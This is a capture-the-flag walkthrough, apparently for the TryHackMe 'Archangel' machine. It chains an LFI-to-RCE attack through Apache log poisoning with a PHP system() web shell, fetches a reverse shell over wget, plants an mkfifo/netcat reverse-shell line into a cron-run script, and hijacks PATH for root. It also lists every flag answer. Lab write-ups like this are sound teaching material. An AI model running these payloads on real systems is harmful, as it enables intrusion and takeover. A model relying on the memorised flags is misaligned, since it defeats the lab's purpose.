# Archangel
## 12-06-2022
## level : easy

## Get a Shell

> we need to add the domain name into our `hosts` file
```
sudo nano /etc/hosts
```
> then add the following line at the end of the file
```
10.10.6.140 mafialive.thm
```

> now just open the domain in browser and we can see the flag 1
> now let's use `gobuster` to search for files and folders within the site
```
gobuster dir -u mafialive.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
> as we have tried all the lfi techniques but the `base64-encoding` one works. we will now see the source code for the pages
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
> in the code we can see that the flag is commented out.

> to use lfi we will use `..//..//` instead of `../../` this will bypass the php file protection
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
```

> now we intercept the request to burp and upload a payload using the user agent.
```
<?php system($_GET['cmd']) ?>
```
> we downloaded a php reverse shell payload and changed the ip to our local machine vpn ip and set the port to 1234.

> now we will upload a php reverse shell to the target. first we will start a local server
```
sudo python -m http.server 80
```
> now to upload the file we will browse this link 
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20http://10.17.48.110/shell.php
```

> now after uploading the file we will start a netcat listener on our local machine.
```
nc -lvnp 1234
```
> now to get a reverse shell we will just browse the following link
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=php%20shell.php
```

> now as we got the shell into our target. lets stabilize it
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm-color

```
| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Find a different hostname | mafialive.thm |
| Find Flag 1 | thm{f0und_th3_r1ght_h0st_n4m3} |
| Look for a page under development | test.php |
| Find flag 2 | thm{explo1t1ng_lf1} |
| Get a shell and find the user flag | thm{lf1_t0_rc3_1s_tr1cky} |



## Root the machine

> so after having the first shell into the target we have looked into the crontab file and it works for us.
```
cat /etc/crontab

```
> now we noticed that there is a file that is running every minute in the crontab file.
> we wrote some payload into the crontab file 
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.48.110 4444 >/tmp/f" > /opt/helloworld.sh
```
> now in our local machine just open a new netcat listener on the port`4444` and wait for a few minute to run the cronjob.
```
nc -lvnp 4444
```
> after getting the shell lets now stabilize the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-color

```

> now we have got a shell as the `archangel` user.

> now inside the `secret` folder we can see that there is a binary which is running the `cp` command. so now let's use the file and manipulate the path to escalate the privileges.

> lets create a local file named `cp` and make this file executable
```
echo "/bin/bash" > cp

chmod +x cp
```

> lets manipulate the path variable
```
export PATH=.:$PATH
```

> now if we run the `backup` file it will now run the `cp` command from current direcroty instead of the original one and we will have the root privileges.







| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Get User 2 flag | thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n} |
| root flag | thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n} |






# -----------------------    THE END    -----------------------
